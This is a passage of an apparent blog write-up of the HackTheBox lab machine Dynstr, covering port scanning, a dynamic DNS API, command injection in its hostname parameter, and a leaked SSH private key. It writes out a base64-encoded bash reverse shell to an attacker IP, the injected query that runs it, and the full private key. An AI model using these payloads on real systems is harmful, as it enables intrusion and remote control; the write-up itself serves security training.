stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Dynstr</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>October 18, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>12 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#dns-api aria-label="DNS API">DNS API</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-bindmgr aria-label="Shell as bindmgr">Shell as bindmgr</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558_huce2c10930a7d47c04b52e8a2dca283c8_140576_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558_huce2c10930a7d47c04b52e8a2dca283c8_140576_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558_huce2c10930a7d47c04b52e8a2dca283c8_140576_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558.png 740w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/dynstr/imgs/image-20211018030910558.png alt width=740 height=464></figure><p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Command injection</li><li>Dynamic DNS</li><li>Wildcard injection</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Burp Suite</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ nmap -p- --min-rate <span class=m>1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-16 21:06 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.244
</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>63</span> <span class=o>(</span>0.078s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> closed ports
</span></span><span class=line><span class=cl>Reason: <span class=m>65532</span> resets
</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON
</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>53/tcp open  domain  syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 41.14 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-16 21:07 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.244
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.54s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>53/tcp open  domain  ISC BIND 9.16.1 <span class=o>(</span>Ubuntu Linux<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: 9.16.1-Ubuntu
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Dyna DNS
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 20.76 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p><p><div class=img-container><img src=imgs/image-20210617082250725.png alt=image-20210617082250725></div></p><p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0">dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p><p><div class=img-container><img src=imgs/image-20210617082428463.png alt=image-20210617082428463></div></p><p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p><p><div class=img-container><img src=imgs/image-20210617082655557.png alt=image-20210617082655557></div></p><p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> 
</span></span></code></pre></div><p>These domain points to the same site.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ curl -s http://10.10.10.244/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>10909</span>
</span></span><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ <span class=k>for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class=p>;</span> <span class=k>do</span> curl -s http://<span class=nv>$i</span>/ <span class=p>|</span> wc -c<span class=p>;</span> <span class=k>done</span> 
</span></span><span class=line><span class=cl><span class=m>10909</span>
</span></span><span class=line><span class=cl><span class=m>10909</span>
</span></span><span class=line><span class=cl><span class=m>10909</span>
</span></span><span class=line><span class=cl><span class=m>10909</span>
</span></span></code></pre></div><h3 id=dns-api>DNS API<a class=anchor aria-hidden=true href=#dns-api>#</a></h3><p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href=https://www.noip.com/integrate/request>no-ip.com</a>:</p><p><div class=img-container><img src=imgs/image-20210617090837052.png alt=image-20210617090837052></div></p><p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p><p><div class=img-container><img src=imgs/image-20210617091044264.png alt=image-20210617091044264></div></p><p>It returned with <code>good</code>.</p><p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53»
</span></span><span class=line><span class=cl>$ dig @10.10.10.244 iamf.no-ip.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl><span class=p>;;</span> Got answer:
</span></span><span class=line><span class=cl><span class=p>;;</span> -&gt;&gt;HEADER<span class=s>&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class=m>38459</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> flags: qr aa rd<span class=p>;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WARNING: recursion requested but not available
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> OPT PSEUDOSECTION:
</span></span><span class=line><span class=cl><span class=p>;</span> EDNS: version: 0, flags:<span class=p>;</span> udp: <span class=m>4096</span>
</span></span><span class=line><span class=cl><span class=p>;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class=o>(</span>good<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> QUESTION SECTION:
</span></span><span class=line><span class=cl><span class=p>;</span>iamf.no-ip.htb.                        IN      A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> ANSWER SECTION:
</span></span><span class=line><span class=cl>iamf.no-ip.htb.         <span class=m>30</span>      IN      A       10.10.14.53
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>864</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.244#53<span class=o>(</span>10.10.10.244<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Wed Jun <span class=m>16</span> 22:23:34 EDT <span class=m>2021</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> MSG SIZE  rcvd: <span class=m>87</span>
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=identify-command-injection>Identify Command Injection<a class=anchor aria-hidden=true href=#identify-command-injection>#</a></h4><p>On Linux, there is a dynamic DNS utility called <a href=https://linux.die.net/man/8/nsupdate><code>nsupdate</code></a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p><p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p><p><div class=img-container><img src=imgs/image-20210617091628552.png alt=image-20210617091628552></div></p><p>If I search for that error on Google, I will see <a href=https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function>this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p><p><div class=img-container><img src=imgs/image-20211018060424803.png alt=image-20211018060424803></div></p><p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit <strong>`echo+iamf1`</strong>.<div class=img-container><img src=imgs/image-20210617093614041.png alt=image-20210617093614041></div></p><p>It again responded with &ldquo;good&rdquo;.</p><p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53»
</span></span><span class=line><span class=cl>$ dig @10.10.10.244 iamf1.no-ip.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl><span class=p>;;</span> Got answer:
</span></span><span class=line><span class=cl><span class=p>;;</span> -&gt;&gt;HEADER<span class=s>&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class=m>65360</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> flags: qr aa rd<span class=p>;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WARNING: recursion requested but not available
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> OPT PSEUDOSECTION:
</span></span><span class=line><span class=cl><span class=p>;</span> EDNS: version: 0, flags:<span class=p>;</span> udp: <span class=m>4096</span>
</span></span><span class=line><span class=cl><span class=p>;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class=o>(</span>good<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> QUESTION SECTION:
</span></span><span class=line><span class=cl><span class=p>;</span>iamf1.no-ip.htb.               IN      A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> ANSWER SECTION:
</span></span><span class=line><span class=cl>iamf1.no-ip.htb.        <span class=m>30</span>      IN      A       10.10.14.53
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>735</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.244#53<span class=o>(</span>10.10.10.244<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Wed Jun <span class=m>16</span> 22:36:20 EDT <span class=m>2021</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> MSG SIZE  rcvd: <span class=m>88</span>
</span></span></code></pre></div><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>"</code> to enclose it, the server response leaks how it updates the DNS entry.</p><p><div class=img-container><img src=imgs/image-20210617101554395.png alt=image-20210617101554395></div></p><h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class=p>|</span>base64 <span class=p>|</span>base64 -w0
</span></span><span class=line><span class=cl><span class=nv>WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class=o>==</span>
</span></span></code></pre></div><p>The final query will looks like this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53
</span></span></code></pre></div><p>On my listener</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.53<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.244<span class=o>]</span> <span class=m>49648</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>659<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@dynstr:/var/www/html/nic$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span></code></pre></div><p>I will upgrade my shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/var/www/html/nic$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>www-data@dynstr:/var/www/html/nic$ which python3
</span></span><span class=line><span class=cl>which python3
</span></span><span class=line><span class=cl>/usr/bin/python3
</span></span><span class=line><span class=cl>www-data@dynstr:/var/www/html/nic$ python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;ython3 -c &#39;</span>import pty<span class=p>;</span>pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>www-data@dynstr:/var/www/html/nic$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>7584</span> suspended  nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>→ root@kali «dynstr» «10.10.14.53»
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>7584</span> continued  nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@dynstr:/var/www/html/nic$ 
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-bindmgr>Shell as bindmgr<a class=anchor aria-hidden=true href=#shell-as-bindmgr>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
</span></span><span class=line><span class=cl>total <span class=m>428</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr <span class=m>237141</span> Mar <span class=m>13</span> 14:53 C62796521-debugging.script
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr  <span class=m>29312</span> Mar <span class=m>13</span> 14:53 C62796521-debugging.timing
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr   <span class=m>1175</span> Mar <span class=m>13</span> 14:53 command-output-C62796521.txt
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr <span class=m>163048</span> Mar <span class=m>13</span> 14:52 strace-C62796521.txt
</span></span></code></pre></div><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl><span class=m>15123</span> openat<span class=o>(</span>AT_FDCWD, <span class=s2>&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class=o>)</span> <span class=o>=</span> <span class=m>5</span>
</span></span><span class=line><span class=cl><span class=m>15123</span> fstat<span class=o>(</span>5, <span class=o>{</span><span class=nv>st_mode</span><span class=o>=</span>S_IFREG<span class=p>|</span>0600, <span class=nv>st_size</span><span class=o>=</span>1823, ...<span class=o>})</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>15123</span> read<span class=o>(</span>5, <span class=s2>&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class=o>)</span> <span class=o>=</span> <span class=m>1823</span>
</span></span></code></pre></div><p>But when I try to use that key for SSH login, it asks for a password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class=line><span class=cl>$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class=line><span class=cl>bindmgr@10.10.10.244<span class=err>&#39;</span>s password:
</span></span></code></pre></div><p>My first guess is SSH has been configured to password only, but I find that <a href=https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option>UseDNS</a> is enabled here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class=p>|</span> grep -v <span class=s1>&#39;^#&#39;</span> <span class=p>|</span> awk <span class=s1>&#39;NF&#39;</span>
</span></span><span class=line><span class=cl>Include /etc/ssh/sshd_config.d/*.conf
</span></span><span class=line><span class=cl>PermitRootLogin yes
</span></span><span class=line><span class=cl>ChallengeResponseAuthentication no
</span></span><span class=line><span class=cl>UsePAM yes
</span></span><span class=line><span class=cl>X11Forwarding yes
</span></span><span class=line><span class=cl>PrintMotd no
</span></span><span class=line><span class=cl>UseDNS yes
</span></span><span class=line><span class=cl>AcceptEnv LANG LC_*
</span></span><span class=line><span class=cl>Subsystem       sftp    /usr/lib/openssh/sftp-server
</span></span></code></pre></div><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/home/bindmgr$ ls -l .ssh/
</span></span><span class=line><span class=cl>ls -l
</span></span><span class=line><span class=cl>total <span class=m>16</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr  <span class=m>419</span> Mar <span class=m>13</span> 14:53 authorized_keys
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> bindmgr bindmgr <span class=m>1823</span> Mar <span class=m>13</span> 14:53 id_rsa
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr  <span class=m>395</span> Mar <span class=m>13</span> 14:53 id_rsa.pub
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> bindmgr bindmgr  <span class=m>444</span> Mar <span class=m>13</span> 14:53 known_hosts
</span></span><span class=line><span class=cl>www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
</span></span><span class=line><span class=cl><span class=nv>from</span><span class=o>=</span><span class=s2>&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</span></span></code></pre></div><h4 id=update-dns>Update DNS<a class=anchor aria-hidden=true href=#update-dns>#</a></h4><p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@dynstr:/etc/bind/$ cat named.conf.local
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// Do any <span class=nb>local</span> configuration here
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Add infrastructure DNS updates.
